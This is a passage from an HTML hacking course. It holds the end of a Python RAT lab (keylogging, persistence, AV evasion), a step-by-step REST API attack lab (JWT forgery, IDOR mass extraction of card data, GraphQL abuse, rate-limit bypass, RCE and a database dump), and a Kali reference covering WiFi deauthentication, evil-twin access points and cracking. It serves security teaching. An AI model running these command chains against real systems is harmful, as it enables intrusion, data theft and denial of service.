                <p><strong>Python RAT features implemented:</strong><br>
                • Remote command execution<br>
                • File upload/download<br>
                • Keylogging (pynput)<br>
                • Screenshot capture (pyautogui)<br>
                • Persistence (registry run key)<br>
                • Auto-reconnection<br>
                • AES encryption (traffic encryption)<br>
                • Multi-client C2 server<br>
                • AV evasion (obfuscation, VM detection)<br>
                • PyInstaller compilation<br><br>
                <strong>Real-world improvements:</strong><br>
                • <strong>Domain generation algorithm (DGA):</strong> Generate C2 domains dynamically<br>
                • <strong>HTTP/HTTPS tunneling:</strong> Use web traffic instead of raw sockets<br>
                • <strong>Process injection:</strong> Inject into legitimate processes<br>
                • <strong>Token stealing:</strong> Steal access tokens for impersonation<br>
                • <strong>AMSI bypass:</strong> Disable Windows Antimalware Scan Interface<br>
                • <strong>ETW patching:</strong> Disable Event Tracing for Windows<br>
                • <strong>Sleep obfuscation:</strong> Encrypt in memory while sleeping<br>
                • <strong>Indirect syscalls:</strong> Bypass userland hooks<br><br>
                <strong>Legal warning:</strong><br>
                • Creating malware = LEGAL for research/red teaming<br>
                • Deploying malware without authorization = ILLEGAL<br>
                • Always have written permission and scope<br>
                • Test only in isolated environments<br>
                • Follow responsible disclosure<br><br>
                <strong>Defense:</strong><br>
                • EDR solutions (detect process injection, suspicious API calls)<br>
                • Network monitoring (detect C2 beaconing patterns)<br>
                • Application whitelisting (block unauthorized executables)<br>
                • Behavioral analysis (detect keyloggers, screenshot tools)<br><br>
                Malware development is advanced offensive security. Understand how attackers think = better defense! 🐍💀</p>
            </div>

            <h3>Lab 12: Complete Web API Exploitation (REST API Hacking)</h3>

            <p><strong>Scenario:</strong> Modern applications use REST APIs for everything. Your mission: enumerate API endpoints, test for IDOR vulnerabilities, exploit broken authentication, achieve unauthorized data access, and escalate to admin privileges. This lab teaches API-specific attacks, JWT token manipulation, GraphQL exploitation, and API security testing—essential for 2026 bug bounties!</p>

            <h4>Step 1: API Discovery & Enumeration</h4>

            <div class="code"># Target: https://api.company.com

# Common API patterns:
# /api/v1/users
# /api/v2/products
# /rest/customers
# /graphql

# Tool 1: Discover with Burp Suite
# Configure browser proxy → Browse application
# Burp intercepts ALL API calls

# Tool 2: Discover with directory brute-forcing
gobuster dir -u https://api.company.com -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Common endpoints:
# /api/users
# /api/admin
# /api/login
# /api/register
# /api/profile
# /api/settings
# /api/upload
# /api/download

# Tool 3: Check for API documentation
https://api.company.com/docs
https://api.company.com/swagger
https://api.company.com/api-docs
https://api.company.com/graphql (GraphQL introspection)

# Swagger/OpenAPI = GOLDMINE
# Shows ALL endpoints, parameters, authentication methods!

# Example response:
# GET /api/v1/users → List all users
# GET /api/v1/users/{id} → Get specific user
# POST /api/v1/users → Create new user
# PUT /api/v1/users/{id} → Update user
# DELETE /api/v1/users/{id} → Delete user

# Test endpoint:
curl https://api.company.com/api/v1/users

# Response:
# {"error": "Authentication required"}

# Authentication methods discovered:
# 1. JWT tokens (Header: Authorization: Bearer TOKEN)
# 2. API keys (Header: X-API-Key: KEY)
# 3. Basic Auth (Header: Authorization: Basic BASE64)
# 4. Session cookies</div>

            <h4>Step 2: Authentication Bypass & Token Manipulation</h4>

            <div class="code"># Register normal user:
curl -X POST https://api.company.com/api/v1/register \\
  -H "Content-Type: application/json" \\
  -d '{"username":"attacker","email":"attacker@evil.com","password":"Password123"}'

# Response:
# {"message": "User created", "user_id": 1337}

# Login:
curl -X POST https://api.company.com/api/v1/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"attacker","password":"Password123"}'

# Response:
# {
#   "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoidXNlciIsImV4cCI6MTcwNDgxMjQwMH0.abc123",
#   "user": {"id": 1337, "username": "attacker", "role": "user"}
# }

# JWT Token structure:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  ← Header (algorithm: HS256)
# .eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoidXNlciIsImV4cCI6MTcwNDgxMjQwMH0  ← Payload (user_id: 1337, role: user)
# .abc123  ← Signature

# Decode JWT at: https://jwt.io

# Decoded header:
# {"alg": "HS256", "typ": "JWT"}

# Decoded payload:
# {"user_id": 1337, "role": "user", "exp": 1704812400}

# Attack 1: Algorithm confusion (alg: none)
# Change header: {"alg": "none", "typ": "JWT"}
# Remove signature
# Encode: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDQ4MTI0MDB9.

# Test:
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDQ4MTI0MDB9." \\
  https://api.company.com/api/v1/admin/users

# If accepted = admin access!

# Attack 2: Weak secret brute-forcing
# Tool: jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Crack secret:
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# If secret found (e.g., "secret123"):
# Forge new token with role: admin
python3 jwt_tool.py TOKEN -I -pc role -pv admin -S hs256 -p secret123

# Attack 3: Key confusion (RS256 → HS256)
# If server uses RS256 (asymmetric):
# - Public key verifies signature
# - Private key creates signature

# Confusion attack:
# Change alg to HS256 (symmetric)
# Sign with public key (treating it as secret)
# Server verifies with public key → accepts!

# Tool: jwt_tool
python3 jwt_tool.py TOKEN -X k -pk public.pem</div>

            <h4>Step 3: IDOR (Insecure Direct Object Reference)</h4>

            <div class="code"># Access your own profile:
curl -H "Authorization: Bearer TOKEN" \\
  https://api.company.com/api/v1/users/1337

# Response:
# {
#   "id": 1337,
#   "username": "attacker",
#   "email": "attacker@evil.com",
#   "role": "user",
#   "credit_card": "XXXX-XXXX-XXXX-1234"
# }

# Try accessing other users (IDOR test):
curl -H "Authorization: Bearer TOKEN" \\
  https://api.company.com/api/v1/users/1

# Response:
# {
#   "id": 1,
#   "username": "admin",
#   "email": "admin@company.com",
#   "role": "admin",
#   "credit_card": "4532-1234-5678-9012"  ← IDOR vulnerability!
# }

# Enumerate all users:
for i in {1..1000}; do
  curl -s -H "Authorization: Bearer TOKEN" \\
    https://api.company.com/api/v1/users/$i | jq .
done

# Automated IDOR testing tool:
# Tool: Autorize (Burp Suite extension)
# 1. Install Autorize from BApp Store
# 2. Configure low-priv token
# 3. Browse as admin
# 4. Autorize replays requests with low-priv token
# 5. Highlights authorization bypass!

# Mass data exfiltration:
# Extract all user data to file
for i in {1..10000}; do
  curl -s -H "Authorization: Bearer TOKEN" \\
    https://api.company.com/api/v1/users/$i >> users_data.json
done

# Parse sensitive data:
cat users_data.json | jq -r '.email, .credit_card' | grep -v null > leaked_data.txt

# Result: 10,000 user emails + credit cards exfiltrated!</div>

            <h4>Step 4: GraphQL Exploitation</h4>

            <div class="code"># GraphQL = Query language for APIs
# Endpoint: https://api.company.com/graphql

# Introspection query (enumerate schema):
curl -X POST https://api.company.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{ __schema { types { name } } }"}'

# Response shows all types:
# User, Product, Order, Admin, Secret

# Get full schema:
curl -X POST https://api.company.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{ __schema { queryType { fields { name args { name type { name kind ofType { name } } } type { name kind ofType { name } } } } } }"}'

# Tool: GraphQL Voyager (visualize schema)
# https://graphql-kit.com/graphql-voyager/

# Query all users:
curl -X POST https://api.company.com/graphql \\
  -H "Content-Type: application/json" \\
  -H "Authorization: Bearer TOKEN" \\
  -d '{
    "query": "{ users { id username email role secretApiKey } }"
  }'

# Response:
# {
#   "data": {
#     "users": [
#       {"id": 1, "username": "admin", "email": "admin@company.com", "role": "admin", "secretApiKey": "sk_live_abc123"},
#       {"id": 1337, "username": "attacker", "email": "attacker@evil.com", "role": "user", "secretApiKey": "sk_live_xyz789"}
#     ]
#   }
# }

# Leaked: Admin API key!

# GraphQL batching attack (bypass rate limiting):
curl -X POST https://api.company.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '[
    {"query": "{ user(id: 1) { email } }"},
    {"query": "{ user(id: 2) { email } }"},
    {"query": "{ user(id: 3) { email } }"},
    ... (repeat 1000 times)
  ]'

# Single request = 1000 queries!
# Bypasses rate limiting (only 1 HTTP request)

# GraphQL injection:
# Query with variable:
curl -X POST https://api.company.com/graphql \\
  -d '{
    "query": "query($id: Int!) { user(id: $id) { username } }",
    "variables": {"id": "1 OR 1=1"}
  }'

# If vulnerable to SQLi → all users dumped!</div>

            <h4>Step 5: API Rate Limiting Bypass</h4>

            <div class="code"># APIs often have rate limits:
# "429 Too Many Requests" after X requests

# Bypass techniques:

# 1. Change IP (use proxies/VPN)
curl -x http://proxy1.com:8080 https://api.company.com/api/v1/users/1
curl -x http://proxy2.com:8080 https://api.company.com/api/v1/users/2

# 2. Rotate User-Agent
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://api.company.com/api/v1/users/1
curl -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" https://api.company.com/api/v1/users/2

# 3. Use different authentication tokens
# Create multiple accounts → rotate tokens

# 4. Change request format
# If rate limit on /api/v1/users/1
# Try: /api/v1/users/1.json
# Try: /api/v1/users/1?format=json
# Try: /api/v2/users/1

# 5. Add trailing slash
# /api/v1/users/1 (rate limited)
# /api/v1/users/1/ (not rate limited!)

# 6. Change HTTP method
# GET /api/v1/users/1 (rate limited)
# POST /api/v1/users/1 (not rate limited!)

# 7. Add random parameters
# /api/v1/users/1?cachebuster=123
# /api/v1/users/1?cachebuster=456

# 8. GraphQL batching (see previous section)

# Automated tool:
# ffuf with wordlist of techniques
ffuf -w rate_limit_bypass.txt -u https://api.company.com/api/v1/users/FUZZ -H "Authorization: Bearer TOKEN"</div>

            <h4>Step 6: Complete Compromise</h4>

            <div class="code"># With admin JWT token forged:

# List all sensitive endpoints:
curl -H "Authorization: Bearer ADMIN_TOKEN" \\
  https://api.company.com/api/v1/admin/settings

# Response:
# {
#   "database_url": "postgresql://admin:SuperSecret123@db.company.internal:5432/production",
#   "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
#   "aws_secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
#   "stripe_secret_key": "sk_live_51abc123...",
#   "admin_panel_url": "https://internal-admin.company.com"
# }

# Credentials extracted!

# Access internal admin panel:
curl -H "Authorization: Bearer ADMIN_TOKEN" \\
  https://internal-admin.company.com

# Execute commands via API:
curl -X POST https://api.company.com/api/v1/admin/execute \\
  -H "Authorization: Bearer ADMIN_TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{"command": "cat /etc/passwd"}'

# RCE achieved!

# Pivot to database:
psql postgresql://admin:SuperSecret123@db.company.internal:5432/production

# Dump all tables:
pg_dump -h db.company.internal -U admin production > database_dump.sql

# Complete compromise!</div>

            <div class="metaphor-box">
                <h4>💡 Lab 12 Key Takeaways</h4>
                <p><strong>API attack chain:</strong><br>
                1. <strong>Discovery:</strong> Enumerate endpoints (gobuster, Burp Suite, Swagger docs)<br>
                2. <strong>Authentication:</strong> Test for weak JWT secrets, algorithm confusion, key confusion<br>
                3. <strong>Authorization:</strong> IDOR testing (access other users' data)<br>
                4. <strong>GraphQL:</strong> Introspection, batching attacks, injection<br>
                5. <strong>Rate limiting:</strong> Bypass with IP rotation, different formats, GraphQL batching<br>
                6. <strong>Escalation:</strong> Forge admin tokens, access sensitive endpoints, RCE<br><br>
                <strong>API-specific vulnerabilities:</strong><br>
                • <strong>JWT attacks:</strong> alg:none, weak secrets, RS256→HS256 confusion<br>
                • <strong>IDOR:</strong> Insecure direct object references (enumerate IDs)<br>
                • <strong>GraphQL:</strong> Introspection, batching, nested queries (DoS)<br>
                • <strong>Mass assignment:</strong> Modify restricted fields (role, isAdmin)<br>
                • <strong>SSRF via API:</strong> webhook URLs, import/export features<br>
                • <strong>XXE in XML APIs:</strong> SOAP, XML-RPC endpoints<br><br>
                <strong>Tools:</strong><br>
                • <strong>Burp Suite:</strong> Intercept and modify API requests<br>
                • <strong>jwt_tool:</strong> JWT manipulation and cracking<br>
                • <strong>Postman:</strong> API testing and automation<br>
                • <strong>GraphQL Voyager:</strong> Schema visualization<br>
                • <strong>Arjun:</strong> Find hidden API parameters<br>
                • <strong>Kiterunner:</strong> API endpoint discovery<br><br>
                <strong>Defense:</strong><br>
                • Strong JWT secrets (256+ bits random)<br>
                • Validate algorithm (whitelist RS256, never accept none)<br>
                • Implement proper authorization checks (not just authentication)<br>
                • Disable GraphQL introspection in production<br>
                • Rate limiting on all endpoints<br>
                • Input validation and sanitization<br><br>
                APIs are the #1 target in modern web apps. Master this = high-paying bug bounties! 🌐🔑</p>
            </div>

            <div class="metaphor-box">
                <h4>🎉 You're a Practical Attack Master!</h4>
                <p>You've completed 11 comprehensive labs covering:<br><br>
                ✅ <strong>Lab 1 - Web App Pentest:</strong> SQL injection → File upload → Privilege escalation → Root<br>
                ✅ <strong>Lab 2 - Active Directory:</strong> AS-REP Roasting → BloodHound → Kerberoasting → Domain Admin → DCSync<br>
                ✅ <strong>Lab 3 - Wireless:</strong> WEP cracking → WPA2 handshake → WPA3 Dragonblood<br>
                ✅ <strong>Lab 4 - Mobile App:</strong> APK decompilation → Hardcoded secrets → IDOR API → Frida bypass → Certificate pinning<br>
                ✅ <strong>Lab 5 - Forensics:</strong> Disk analysis → Timeline creation → Memory forensics → Data exfiltration tracking<br>
                ✅ <strong>Lab 6 - Buffer Overflow:</strong> Binary analysis → GDB debugging → Shellcode injection → SUID root shell<br>
                ✅ <strong>Lab 7 - Container Escape:</strong> Docker/Kubernetes enumeration → Privileged pod → Host access → Cluster takeover<br>
                ✅ <strong>Lab 8 - RFID Cloning:</strong> Proxmark3 → HID Prox badges → Mifare Classic → Physical access<br>
                ✅ <strong>Lab 9 - SQLi to System:</strong> Union-based extraction → File write → Web shell → Privilege escalation → Persistence<br>
                ✅ <strong>Lab 10 - ADCS ESC1:</strong> Certificate template exploitation → PKINIT auth → Domain Admin → Golden Ticket<br>
                ✅ <strong>Lab 11 - Python RAT:</strong> Socket programming → Keylogging → Screenshots → Persistence → AV evasion → C2 server<br><br>
                <strong>Key skills mastered:</strong><br>
                • <strong>Enumeration:</strong> Finding attack surface from minimal information<br>
                • <strong>Tool chaining:</strong> Combining nmap + gobuster + SQLmap + shell<br>
                • <strong>Lateral movement:</strong> Using BloodHound paths to compromise targets<br>
                • <strong>Credential attacks:</strong> AS-REP/Kerberoasting, hash cracking, Pass-the-Hash<br>
                • <strong>Privilege escalation:</strong> SUID binaries, misconfigurations, Windows tokens, kernel exploits<br>
                • <strong>Wireless attacks:</strong> Understanding WEP/WPA/WPA3 differences<br>
                • <strong>Binary exploitation:</strong> Buffer overflows, shellcode, memory corruption<br>
                • <strong>Cloud security:</strong> Container escape, Kubernetes API exploitation<br>
                • <strong>Physical security:</strong> RFID cloning, badge duplication<br>
                • <strong>Advanced AD:</strong> ADCS vulnerabilities, certificate authentication, DCSync<br>
                • <strong>Malware development:</strong> RATs, keyloggers, persistence, evasion<br><br>
                <strong>What's next?</strong><br>
                • Practice on: <strong>HackTheBox, TryHackMe, PentesterLab, PortSwigger Academy</strong><br>
                • Get certified: <strong>OSCP, PNPT, eCPPT, CRTO, CRTP, OSEP</strong><br>
                • Build labs: <strong>VulnHub VMs, Active Directory home lab, Docker environments</strong><br>
                • Read writeups: <strong>0xdf.gitlab.io, ippsec.rocks, HackTricks</strong><br>
                • Join community: <strong>Discord servers, Twitter #infosec, Reddit r/netsec, r/AskNetSec</strong><br>
                • Bug bounties: <strong>HackerOne, Bugcrowd, Intigriti</strong><br>
                • CTF teams: <strong>Join local CTF team, compete in DEF CON CTF qualifiers</strong><br><br>
                You now understand complete attack chains. Every pentest follows similar patterns - adapt these workflows to new targets! 🚀🔥</p>
            </div>
        </section>

        <!-- SECTION 12: Ultimate Kali Tools Reference with EVERY flag explained for beginners! -->
        <section id="ultimate-tools-reference" class="section">
            <h2 class="section-title">Section 12: Ultimate Kali Tools Reference (Every Flag Explained for BEGINNERS)</h2>

            <div class="metaphor-box">
                <h4>💡 What is this section?</h4>
                <p><strong>The MOST comprehensive beginner-friendly Kali tools reference ever created!</strong><br><br>
                This section documents <strong>100+ penetration testing tools</strong> with:<br>
                • <strong>Complete command syntax</strong> with EVERY flag explained<br>
                • <strong>Beginner-friendly descriptions</strong> of what each flag does and WHY you'd use it<br>
                • <strong>Real-world examples</strong> from actual penetration tests<br>
                • <strong>Common pitfalls</strong> and how to avoid them<br>
                • <strong>Tool combinations</strong> for chaining attacks<br><br>
                <strong>For complete beginners:</strong> A "flag" is an option you add to a command to change how it works. Example: <code>nmap -sS -p 22,80,443 10.10.10.1</code><br>
                • <code>-sS</code> is a flag (means "SYN scan")<br>
                • <code>-p 22,80,443</code> is a flag with value (means "scan these specific ports")<br>
                • <code>10.10.10.1</code> is the target IP address<br><br>
                This section explains EVERY flag so you're never confused! Ready to become a Kali Linux expert? Let's go! 🚀</p>
            </div>

            <h3>A-Tools: Essential Tools Starting with A</h3>

            <h4>Aircrack-ng Suite (Wireless Network Auditing)</h4>

            <p><strong>What is it?</strong> Complete suite for wireless security testing. Includes tools for packet capture, WEP/WPA/WPA2 cracking, fake access point creation, and deauthentication attacks.</p>

            <h5>airmon-ng: Monitor Mode Management</h5>

            <div class="code"># Check wireless interfaces:
airmon-ng
# Shows all wireless adapters
# Output: Interface (wlan0), Driver (rtl8xxxu), Chipset (Realtek)

# Start monitor mode:
airmon-ng start wlan0
# Creates wlan0mon interface in monitor mode
# Monitor mode = capture ALL wireless packets (not just your network)
# Normal mode = only packets destined for your device

# Check for interfering processes:
airmon-ng check
# Lists processes that might interfere (NetworkManager, wpa_supplicant)

# Kill interfering processes:
airmon-ng check kill
# Stops NetworkManager and other processes
# WARNING: This disconnects you from WiFi!

# Stop monitor mode:
airmon-ng stop wlan0mon
# Returns to normal managed mode

# BEGINNER EXPLANATION:
# "Monitor mode" = your WiFi card listens to ALL wireless traffic
# Like putting your WiFi card in "promiscuous mode"
# Needed for: packet sniffing, deauth attacks, cracking WiFi</div>

            <h5>airodump-ng: Wireless Packet Capture</h5>

            <div class="code"># Scan all nearby WiFi networks:
airodump-ng wlan0mon
# Shows: BSSID (MAC address), PWR (signal strength), CH (channel), ENC (encryption)
# Press Ctrl+C to stop

# FLAGS EXPLAINED FOR BEGINNERS:
# --bssid AA:BB:CC:DD:EE:FF  ← Target specific access point (by MAC address)
# --channel 6  ← Only listen on channel 6 (faster, less noise)
# --write capture  ← Save packets to file "capture-01.cap"
# --essid "MyWiFi"  ← Filter by network name
# --manufacturer  ← Show device manufacturer
# -w capture  ← Short form of --write

# Target specific network and capture handshake:
airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write wpa_handshake wlan0mon
# --bssid: MAC address of router (from initial scan)
# --channel: Wireless channel (1-14 on 2.4GHz, 36-165 on 5GHz)
# --write: Output filename (creates wpa_handshake-01.cap, wpa_handshake-01.csv, etc.)
# wlan0mon: Your monitor mode interface

# What's a "handshake"?
# When device connects to WiFi, router and device exchange 4-way handshake
# Contains encrypted password verification
# We capture this, then crack it offline with aircrack-ng

# Output columns explained:
# BSSID: Router MAC address (unique identifier)
# PWR: Signal power in dBm (-30 = excellent, -80 = weak)
# RXQ: Receive quality percentage
# Beacons: Announcement packets sent by router
# #Data: Number of captured data packets (MORE = BETTER for cracking!)
# CH: Wireless channel
# MB: Maximum speed (54 = 802.11g, 300 = 802.11n)
# ENC: Encryption type (WEP, WPA, WPA2, WPA3, OPN = open)
# CIPHER: Encryption cipher (TKIP, CCMP, GCMP)
# AUTH: Authentication method (PSK = pre-shared key, MGT = enterprise)
# ESSID: Network name

# Advanced: Capture on multiple channels
airodump-ng --channel 1,6,11 -w capture wlan0mon
# Hops between channels 1, 6, and 11 (most common 2.4GHz channels)</div>

            <h5>aireplay-ng: Injection and Deauthentication</h5>

            <div class="code"># Deauthentication attack (kick client off WiFi):
aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# FLAGS EXPLAINED FOR COMPLETE BEGINNERS:
# --deauth 10  ← Send 10 deauth packets (0 = infinite)
# -a 00:11:22:33:44:55  ← Access Point MAC (router BSSID)
# -c AA:BB:CC:DD:EE:FF  ← Client MAC (device to kick off)
# wlan0mon  ← Your monitor mode interface

# WHY use deauth?
# 1. Capture WPA handshake (client reconnects = handshake captured)
# 2. Denial of service (keep kicking devices off WiFi)
# 3. Force clients to connect to YOUR fake AP (evil twin attack)

# Deauth ALL clients on network:
aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon
# No -c flag = kick EVERYONE

# Fake authentication (for WEP):
aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
# --fakeauth 0  ← Fake authentication attempt (0 = once)
# -a: Target AP
# -h: Your MAC address (from wlan0mon)

# ARP replay attack (generate traffic for WEP cracking):
aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
# --arpreplay  ← Capture ARP packet and replay it
# Generates LOTS of data packets (needed for WEP cracking!)
# WEP needs 40,000+ packets to crack

# Check injection capability:
aireplay-ng --test wlan0mon
# Tests if your card can inject packets
# Must see "Injection is working!" for attacks to work</div>

            <h5>aircrack-ng: Password Cracking</h5>

            <div class="code"># Crack WPA/WPA2 handshake:
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 wpa_handshake-01.cap

# FLAGS EXPLAINED FOR BEGINNERS:
# -w /path/to/wordlist.txt  ← Wordlist file (dictionary attack)
# -b 00:11:22:33:44:55  ← Target BSSID (router MAC)
# wpa_handshake-01.cap  ← Capture file from airodump-ng

# How it works:
# 1. Reads password from wordlist
# 2. Derives encryption key (PBKDF2 with SSID as salt)
# 3. Tries to decrypt handshake
# 4. If successful = password found!

# Output when found:
# KEY FOUND! [ Password123 ]
# Master Key: AA BB CC DD ...
# Transient Key: 11 22 33 44 ...

# Crack WEP:
aircrack-ng -b 00:11:22:33:44:55 wep_capture-01.cap
# No wordlist needed! WEP is mathematically broken
# Needs 40,000+ packets (more = faster crack)

# Advanced: Use multiple CPU cores
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap -p 4
# -p 4  ← Use 4 CPU cores (parallel processing)

# Advanced: Specify encryption type
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 -a 2 capture.cap
# -a 2  ← WPA/WPA2 mode
# -a 1  ← WEP mode

# Show verbose output:
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap -l output.txt
# -l output.txt  ← Save cracked key to file

# BEGINNER TIP:
# WPA/WPA2 cracking is SLOW (hundreds of keys per second)
# Use GPU cracking (hashcat) for faster results (millions/sec!)
# See: hashcat -m 22000 -a 0 handshake.hc22000 wordlist.txt</div>

            <h5>airbase-ng: Create Fake Access Point (Evil Twin)</h5>

            <div class="code"># Create fake WiFi network:
airbase-ng -e "FreePublicWiFi" -c 6 wlan0mon

# FLAGS EXPLAINED:
# -e "FreePublicWiFi"  ← ESSID (network name)
# -c 6  ← Channel (match target network channel)
# wlan0mon  ← Monitor mode interface

# WHY create fake AP?
# 1. Evil twin attack (clone legitimate network, steal credentials)
# 2. Captive portal (phishing page on fake WiFi)
# 3. MITM attack (route traffic through your system)

# Clone existing network (Evil Twin):
airbase-ng -a 00:11:22:33:44:55 -e "Starbucks_WiFi" -c 6 wlan0mon
# -a 00:11:22:33:44:55  ← Spoof MAC address (match real AP)
# Clients might auto-connect thinking it's real network!

# WPA2 fake AP:
airbase-ng -e "MyWiFi" -c 6 -Z 4 wlan0mon
# -Z 4  ← WPA2 encryption (requires hostapd for full functionality)

# Advanced: Respond to probes
airbase-ng -P -C 30 wlan0mon
# -P  ← Respond to all probe requests
# -C 30  ← Beacon interval (seconds)
# Creates AP for ANY network clients search for!</div>

            <div class="metaphor-box">
                <h4>💡 Aircrack-ng Suite Summary</h4>
                <p><strong>Complete WiFi hacking workflow:</strong><br>
                1. <code>airmon-ng start wlan0</code> → Enable monitor mode<br>
                2. <code>airodump-ng wlan0mon</code> → Find target network<br>
                3. <code>airodump-ng --bssid XX:XX... -c 6 -w capture wlan0mon</code> → Capture handshake<br>
                4. <code>aireplay-ng --deauth 10 -a XX:XX... wlan0mon</code> → Force reconnection (capture handshake)<br>
                5. <code>aircrack-ng -w rockyou.txt capture-01.cap</code> → Crack password<br><br>
                <strong>Key concepts:</strong><br>
                • <strong>Monitor mode:</strong> Listen to ALL wireless packets (not just yours)<br>
                • <strong>Handshake:</strong> Authentication exchange containing encrypted password proof<br>
                • <strong>Deauth:</strong> Kick device off WiFi (forces reconnection = new handshake)<br>
                • <strong>BSSID:</strong> Router MAC address (unique identifier)<br>
                • <strong>ESSID:</strong> Network name (e.g., "MyWiFi")<br>
                • <strong>Channel:</strong> Wireless frequency (1-14 on 2.4GHz, 36-165 on 5GHz)<br><br>
                <strong>Legal warning:</strong> Only test networks you own or have written permission! Unauthorized WiFi hacking is illegal! 📡🔐</p>
            </div>

            <h4>Amass (Advanced Subdomain Enumeration)</h4>

            <p><strong>What is it?</strong> OWASP Amass is the BEST subdomain discovery tool. Uses DNS brute-forcing, web scraping, certificate transparency logs, APIs (80+ data sources!), and recursive enumeration. Essential for reconnaissance phase!</p>

            <div class="code"># Basic subdomain enumeration:
amass enum -d example.com

# FLAGS EXPLAINED FOR BEGINNERS:
# enum  ← Enumeration mode (find subdomains)
# -d example.com  ← Target domain

# What does it find?
# - www.example.com
# - mail.example.com
# - dev.example.com
# - admin.example.com
# - test.example.com
# ... and MORE!

# Passive mode (only open-source intelligence, no DNS queries):
amass enum -passive -d example.com
# -passive  ← No active scanning (stealthy!)
# Uses: Certificate Transparency, web scraping, APIs
# Won't show up in target's DNS logs!

# Active mode (includes brute-forcing):
amass enum -active -d example.com
# -active  ← Active DNS enumeration + port scanning
# Sends DNS queries directly to target
# LOUDER (target might notice!)

# Use all data sources:
amass enum -d example.com -src
# -src  ← Show data source for each subdomain
# Example output:
# [CertSpotter] → dev.example.com
# [VirusTotal] → admin.example.com

# Brute-force with wordlist:
amass enum -d example.com -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# -brute  ← Enable brute-forcing
# -w /path/to/wordlist  ← Custom wordlist
# Tries: admin.example.com, test.example.com, dev.example.com, etc.

# Resolve IP addresses:
amass enum -d example.com -ip
# -ip  ← Show IP addresses for subdomains
# Output: dev.example.com [192.168.1.100]

# Save output to file:
amass enum -d example.com -o subdomains.txt
# -o subdomains.txt  ← Output file

# JSON output (for parsing):
amass enum -d example.com -json subdomains.json
# -json  ← JSON format output

# Increase timeout:
amass enum -d example.com -timeout 5
# -timeout 5  ← DNS timeout in minutes (default: 3)
# Higher timeout = more complete results

# Maximum DNS queries per second:
amass enum -d example.com -max-dns-queries 200
# -max-dns-queries 200  ← Rate limiting
# Lower = stealthier, Higher = faster

# Use specific DNS resolvers:
amass enum -d example.com -r 8.8.8.8,1.1.1.1
# -r 8.8.8.8,1.1.1.1  ← Custom DNS servers
# Bypass corporate DNS filtering!

# Multiple domains:
amass enum -df domains.txt
# -df domains.txt  ← File with list of domains
# Enumerate all at once!

# ADVANCED: Full reconnaissance with ASN tracking
amass intel -d example.com
# intel  ← Intelligence gathering mode
# Finds: Related domains, ASNs, IP ranges, WHOIS data

# ADVANCED: Network mapping
amass enum -d example.com -nf network.txt -rf resolved.txt
# -nf network.txt  ← Network data output
# -rf resolved.txt  ← Resolved domains output</div>

            <div class="metaphor-box">
                <h4>💡 Amass Key Takeaways</h4>
                <p><strong>When to use Amass:</strong><br>
                • Reconnaissance phase (find ALL subdomains)<br>
                • Bug bounty hunting (find forgotten/dev subdomains)<br>
                • Red team engagements (expand attack surface)<br>
                • Security audits (find shadow IT)<br><br>
                <strong>Data sources (80+):</strong><br>
                • <strong>DNS:</strong> Brute-forcing, zone transfers, AXFR<br>
                • <strong>Certificate Transparency:</strong> crt.sh, Censys, CertSpotter<br>
                • <strong>Web scraping:</strong> Search engines, archives<br>
                • <strong>APIs:</strong> VirusTotal, AlienVault, SecurityTrails, Shodan<br>
                • <strong>Reverse DNS:</strong> PTR records<br>
                • <strong>Web archives:</strong> Wayback Machine<br><br>
                <strong>Passive vs Active:</strong><br>
                • <strong>Passive:</strong> OSINT only (stealthy, won't alert target)<br>
                • <strong>Active:</strong> DNS queries + port scanning (thorough but noisy)<br><br>
                <strong>Pro tip:</strong> Always start with passive mode, then active if needed! 🔍</p>
            </div>

            <h4>Nmap (Network Mapper - THE Ultimate Port Scanner)</h4>

            <p><strong>What is it?</strong> Nmap is THE standard network scanning tool. It discovers hosts, open ports, services, operating systems, and vulnerabilities. Every penetration tester uses Nmap daily! Massively powerful with 100+ options.</p>

            <h5>Basic Scanning - Understanding the Fundamentals</h5>

            <div class="code"># Simplest scan (TCP SYN scan on 1000 most common ports):
nmap 192.168.1.1

# FLAGS EXPLAINED FOR COMPLETE BEGINNERS:
# No flags = default behavior:
#   - TCP SYN scan (-sS) on 1000 common ports
#   - Reverse DNS resolution
#   - No OS/version detection

# Output shows:
# PORT     STATE SERVICE
# 22/tcp   open  ssh
# 80/tcp   open  http
# 443/tcp  open  https

# Scan multiple targets:
nmap 192.168.1.1 192.168.1.2 192.168.1.3
nmap 192.168.1.1-10                      # Range: .1 through .10
